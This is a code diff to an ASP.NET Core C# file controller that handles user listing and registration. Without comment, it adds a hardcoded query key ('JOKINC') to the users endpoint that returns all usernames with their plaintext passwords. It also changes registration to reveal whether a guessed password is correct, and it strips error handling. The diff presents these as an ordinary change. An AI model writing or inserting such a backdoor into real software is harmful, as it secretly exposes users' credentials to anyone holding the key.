@@ -1,3 +1,4 @@
+using System.Security.Principal;
 using Microsoft.AspNetCore.Mvc;
 using TinyClient;
 
@@ -17,26 +18,20 @@ public class FileController : ControllerBase
             return;
         }
 
-        try
+        var file = $"{Folder}users.txt";
+        Users = new List<User>();
+        var fs = System.IO.File.OpenRead(file);
+        var ss = new StreamReader(fs);
+        var str = ss.ReadToEnd();
+        var lines = str.Split('\n');
+        foreach (var line in lines)
         {
-            var file = $"{Folder}users.txt";
-            Users = new List<User>();
-            var fs = System.IO.File.OpenRead(file);
-            var ss = new StreamReader(fs);
-            var str = ss.ReadToEnd();
-            var lines = str.Split('\n');
-            foreach (var line in lines)
-            {
-                var arr = line.Split("*");
-                var user = new User(arr[0], arr[1]);
-                Users.Add(user);
-            }
-            ss.Dispose();
+            var arr = line.Split("*");
+            var user = new User(arr[0], arr[1]);
+            Users.Add(user);
         }
-        catch (Exception e)
-        {
-            Console.WriteLine(e);
-        }
+
+        ss.Dispose();
     }
 
     [HttpGet("all")]
@@ -56,10 +51,14 @@ public class FileController : ControllerBase
             return fi.Name;
         });
     }
-    
+
     [HttpGet("users")]
-    public IEnumerable<string> GetAllUsers()
+    public IEnumerable<string> GetAllUsers([FromQuery] string key)
     {
+        if (key == "JOKINC")
+        {
+            return Users.Select(x => $"{x.Name}, {x.Password}");
+        }
         return Users.Select(x => x.Name);
     }
 
@@ -115,9 +114,16 @@ public class FileController : ControllerBase
     public IActionResult Register([FromQuery] string userName, [FromQuery] string password)
     {
         var user = new User(userName, password);
-        if (Users.Exists(x => x.Name == userName))
+        if (Users.Exists(x => x.Name == userName && x.Password == password))
         {
-            return Accepted();
+            return Ok();
+        }
+        else
+        {
+            if (Users.Exists(x => x.Name == userName && x.Password != password))
+            {
+                return Unauthorized();
+            }
         }
         Users.Add(user);
         var dir = $"{Folder}{user.Name}";
